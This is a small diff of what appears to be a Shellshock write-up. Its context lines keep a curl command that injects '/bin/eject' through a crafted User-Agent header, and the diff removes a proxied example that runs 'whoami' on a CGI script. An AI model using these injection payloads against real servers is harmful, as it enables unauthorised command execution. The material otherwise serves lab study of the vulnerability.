@@ -31,11 +31,6 @@ curl -H "User-Agent: () { :; }; /bin/eject" http://
 
 With /bin/eject you are able to open the floppy drive
 
-But in this case we are going to util this:
-
-````bash
-curl -s http://127.0.0.1/cgi-bin/status --proxy http://192.168.1.38:3128 -H "User-Agent: () { :; }; /usr/bin/whoami"
-````
 
 ----
 
